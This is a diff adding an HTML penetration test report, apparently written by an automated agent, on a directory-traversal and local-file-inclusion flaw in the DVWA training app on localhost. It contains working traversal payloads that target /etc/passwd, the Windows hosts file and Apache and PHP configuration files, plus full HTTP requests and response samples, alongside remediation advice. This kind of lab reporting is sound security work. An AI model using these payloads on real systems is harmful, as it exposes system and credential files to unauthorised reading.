@@ -1,0 +1,233 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Penetration Test Report - DVWA Local File Inclusion</title>
+    <style>
+        body {
+            font-family: 'Courier New', Courier, monospace;
+            background-color: #1e1e1e;
+            color: #d4d4d4;
+            margin: 0;
+            padding: 20px;
+            line-height: 1.6;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        h1, h2, h3 {
+            color: #569cd6;
+            border-bottom: 2px solid #569cd6;
+            padding-bottom: 5px;
+        }
+        h1 {
+            text-align: center;
+            font-size: 2.5em;
+        }
+        .header {
+            background-color: #2d2d30;
+            padding: 20px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+        }
+        .section {
+            background-color: #2d2d30;
+            padding: 20px;
+            margin-bottom: 20px;
+            border-radius: 5px;
+        }
+        .code-block {
+            background-color: #1e1e1e;
+            border: 1px solid #3c3c3c;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            font-family: 'Courier New', Courier, monospace;
+            margin: 10px 0;
+        }
+        .vulnerable {
+            color: #f48771;
+            font-weight: bold;
+        }
+        .safe {
+            color: #73c991;
+            font-weight: bold;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }
+        th, td {
+            border: 1px solid #3c3c3c;
+            padding: 10px;
+            text-align: left;
+        }
+        th {
+            background-color: #252526;
+            color: #569cd6;
+        }
+        tr:nth-child(even) {
+            background-color: #2d2d30;
+        }
+        .payload {
+            color: #d7ba7d;
+        }
+        .highlight {
+            background-color: #264f78;
+            padding: 2px 4px;
+            border-radius: 3px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>Penetration Test Report</h1>
+            <p><strong>Target:</strong> http://localhost/dvwa</p>
+            <p><strong>Date:</strong> 2025-08-03 02:18:07</p>
+            <p><strong>Author:</strong> Automated Security Agent</p>
+            <p><strong>Classification:</strong> UNCLASSIFIED</p>
+        </div>
+
+        <div class="section">
+            <h2>Executive Summary</h2>
+            <p>This penetration test identified a critical Directory Traversal vulnerability in the Damn Vulnerable Web Application (DVWA). The vulnerability allows unauthorized access to sensitive system files through improper input validation in the File Inclusion functionality.</p>
+            <p><strong>Risk Level:</strong> <span class="vulnerable">HIGH</span></p>
+            <p>The vulnerability was successfully exploited to read system configuration files, demonstrating the potential for sensitive information disclosure.</p>
+        </div>
+
+        <div class="section">
+            <h2>Vulnerability Details</h2>
+            <table>
+                <tr><th>Category</th><th>Details</th></tr>
+                <tr><td><strong>Name</strong></td><td>Directory Traversal / Local File Inclusion</td></tr>
+                <tr><td><strong>OWASP ID</strong></td><td>OTG-AUTHZ-001</td></tr>
+                <tr><td><strong>Risk Level</strong></td><td><span class="vulnerable">HIGH</span></td></tr>
+                <tr><td><strong>URL</strong></td><td>http://localhost/dvwa/vulnerabilities/fi/</td></tr>
+                <tr><td><strong>Description</strong></td><td>The application fails to properly validate user-supplied input in the file inclusion functionality, allowing attackers to traverse the file system and access arbitrary files.</td></tr>
+                <tr><td><strong>Impact</strong></td><td>Unauthorized access to sensitive system files, potential disclosure of configuration details, credentials, and system information.</td></tr>
+                <tr><td><strong>Remediation</strong></td><td>Implement proper input validation, use whitelisting for allowed files, and avoid direct user input in file inclusion functions.</td></tr>
+            </table>
+        </div>
+
+        <div class="section">
+            <h2>Technical Analysis</h2>
+            <h3>Exploitation Process</h3>
+            <p>The vulnerability was exploited through the following steps:</p>
+            <ol>
+                <li>Authenticated to DVWA using default credentials</li>
+                <li>Set security level to "Low"</li>
+                <li>Accessed the File Inclusion page at <code>/vulnerabilities/fi/</code></li>
+                <li>Injected directory traversal payloads in the <code>page</code> parameter</li>
+                <li>Successfully retrieved contents of system files</li>
+            </ol>
+
+            <h3>Test Results</h3>
+            <table>
+                <tr>
+                    <th>Payload</th>
+                    <th>Status</th>
+                    <th>Response Length</th>
+                </tr>
+                <tr>
+                    <td class="payload">../../../../../../../../../../xampp/php/php.ini</td>
+                    <td class="safe">NOT VULNERABLE</td>
+                    <td>154</td>
+                </tr>
+                <tr>
+                    <td class="payload">../../../../../../../../../../Windows/System32/drivers/etc/hosts</td>
+                    <td class="vulnerable">VULNERABLE</td>
+                    <td>4572</td>
+                </tr>
+                <tr>
+                    <td class="payload">../../../../../../../../../../xampp/apache/conf/httpd.conf</td>
+                    <td class="vulnerable">VULNERABLE</td>
+                    <td>26133</td>
+                </tr>
+                <tr>
+                    <td class="payload">../../../../../../../../../../etc/passwd</td>
+                    <td class="safe">NOT VULNERABLE</td>
+                    <td>4081</td>
+                </tr>
+                <tr>
+                    <td class="payload">../../../../../../../../../../etc/hosts</td>
+                    <td class="safe">NOT VULNERABLE</td>
+                    <td>4079</td>
+                </tr>
+            </table>
+            <h3>Proof of Concept</h3>
+            <p>The following payloads successfully exploited the vulnerability:</p>
+            <h4>Payload 1:</h4>
+            <div class="code-block">
+<span class="highlight">GET</span> /dvwa/vulnerabilities/fi/?page=../../../../../../../../../../Windows/System32/drivers/etc/hosts <span class="highlight">HTTP/1.1</span>
+<span class="highlight">Host:</span> localhost
+<span class="highlight">Cookie:</span> [Session Cookies]
+
+<span class="highlight">Response Sample:</span>
+<pre>﻿# Copyright (c) 1993-2009 Microsoft Corp.
+#
+# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
+#
+# This file contains the mappings of IP addresses to host names. Each
+# entry should be kept on an individual line. The IP address should
+# be placed in the first column followed by the corresponding host name.
+# The IP address and the host name should be separated by at least one
+# space.
+#
+# Additionally, comments (such as these) may be inserted on individual
+# lines or</pre>
+            </div>
+            <h4>Payload 2:</h4>
+            <div class="code-block">
+<span class="highlight">GET</span> /dvwa/vulnerabilities/fi/?page=../../../../../../../../../../xampp/apache/conf/httpd.conf <span class="highlight">HTTP/1.1</span>
+<span class="highlight">Host:</span> localhost
+<span class="highlight">Cookie:</span> [Session Cookies]
+
+<span class="highlight">Response Sample:</span>
+<pre>#
+# This is the main Apache HTTP server configuration file.  It contains the
+# configuration directives that give the server its instructions.
+# See &lt;URL:http://httpd.apache.org/docs/2.4/&gt; for detailed information.
+# In particular, see 
+# &lt;URL:http://httpd.apache.org/docs/2.4/mod/directives.html&gt;
+# for a discussion of each configuration directive.
+#
+# Do NOT simply read the instructions in here without understanding
+# what they do.  They&#x27;re here only as hints or reminders.  If you are u</pre>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>Conclusion</h2>
+            <p>The Directory Traversal vulnerability in DVWA represents a significant security risk that could allow attackers to access sensitive system files. Immediate remediation is recommended to prevent potential information disclosure and system compromise.</p>
+        </div>
+
+        <div class="section">
+            <h2>Recommendations</h2>
+            <ul>
+                <li>Implement strict input validation on file inclusion parameters</li>
+                <li>Use whitelisting to restrict accessible files</li>
+                <li>Avoid using user-supplied input directly in file operations</li>
+                <li>Regularly review and test file inclusion functionality</li>
+                <li>Consider using secure coding practices and frameworks</li>
+            </ul>
+        </div>
+
+        <div class="section">
+            <h2>Appendices</h2>
+            <h3>Tested Payloads</h3>
+            <div class="code-block">../../../../../../../../../../xampp/php/php.ini<br>../../../../../../../../../../Windows/System32/drivers/etc/hosts<br>../../../../../../../../../../xampp/apache/conf/httpd.conf<br>../../../../../../../../../../etc/passwd<br>../../../../../../../../../../etc/hosts<br>
+            </div>
+            
+            <h3>References</h3>
+            <ul>
+                <li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include">OWASP Testing Guide - Directory Traversal</a></li>
+                <li><a href="https://www.dvwa.co.uk/">Damn Vulnerable Web Application Documentation</a></li>
+                <li><a href="https://owasp.org/www-community/attacks/Path_Traversal">OWASP Path Traversal</a></li>
+            </ul>
+        </div>
+    </div>
+</body>
+</html>
